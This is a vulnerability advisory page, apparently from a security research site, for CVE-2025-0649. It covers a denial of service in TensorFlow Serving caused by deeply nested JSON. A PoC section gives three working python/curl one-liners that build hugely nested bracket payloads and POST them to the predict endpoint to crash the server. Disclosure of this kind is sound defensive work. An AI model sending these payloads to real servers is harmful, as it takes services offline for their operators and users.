{"hash":"8b54458a99990616f67469e42b894f6c20351e1f","data":{"post":{"title":"Tensorflow Serving Stack Exhaustion DoS","path":"/vulnerabilities/tensorflow-serving-stacko-dos/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>This vulnerability allows unauthenticated remote attackers to cause the server to stop responding to requests due to a stack exhaustion when parsing malformed JSON input</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/tensorflow/serving\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Tensorflow Serving</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(, 2.17.0]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>TensorFlow Serving uses RapidJSON to process JSON input. The function <a href=\"https://github.com/tensorflow/serving/blob/6e0d7a5f00d15a2d73b8cd3411b6dcbe6b25d0b1/tensorflow_serving/util/json_tensor.cc#L419\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ParseJson</a> in <a href=\"https://github.com/tensorflow/serving/blob/master/tensorflow_serving/util/json_tensor.cc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">json-tensor.cc</a> uses RapidJSON’s ParseStream function <a href=\"https://github.com/tensorflow/serving/blob/6e0d7a5f00d15a2d73b8cd3411b6dcbe6b25d0b1/tensorflow_serving/util/json_tensor.cc#L431\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">to parse the JSON input</a>. The default behavior of RapidJSON’s parsing function is [to parse the input recursively](<a href=\"https://rapidjson.org/md_doc_features.html#Parsing:~:text=Parsing-,Recursive\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://rapidjson.org/md_doc_features.html#Parsing:~:text=Parsing-,Recursive</a> (default),-and iterative parser) with no limit on the recursion depth. A malicious JSON string with an array or object that are deeply nested in each other can cause the server to crash.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Run TensorFlow Serving using the instructions in the page: <a href=\"https://www.tensorflow.org/tfx/serving/docker\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.tensorflow.org/tfx/serving/docker</a>.</p>\n<p>Then, run any of the following commands in a shell -</p>\n<ol>\n<li>\n<pre><code>python -c 'print(\"{\\\"instances\\\": [1.0, 2.0, 5.0],\\\"signature_name\\\":\" + \"[\" * 500000 + \"]\" * 500000 + \"}\")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict\n</code></pre>\n</li>\n<li>\n<pre><code>python -c 'print(\"{\\\"instances\\\": [1.0, 2.0, 5.0],\\\"signature_name\\\":\" + \"[\" * 50000 + \"]\" * 50000 + \"}\")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict\n</code></pre>\n</li>\n<li>\n<pre><code>python -c 'print(\"{\\\"instances\\\":\" + \"[\" * 50000 + \"1\" + \"]\" * 50000 + \"}\")' > /tmp/malicious.txt curl -v -d @/tmp/malicious.txt -X POST http://localhost:8501/v1/models/half_plus_two:predict\n</code></pre>\n</li>\n</ol>\n<p>The server will crash.</p>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/tensorflow/serving/commit/6cb013167d13f2ed3930aabb86dbc2c8c53f5adf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2025-0649 High severity. Tensorflow Serving Stack Exhaustion DoS","date_published":"2025-05-06","xray_id":"","vul_id":"CVE-2025-0649","severity":"high","discovered_by":"Ori Hollander","last_updated":"2025-05-06","cvss":8.9}},"context":{}}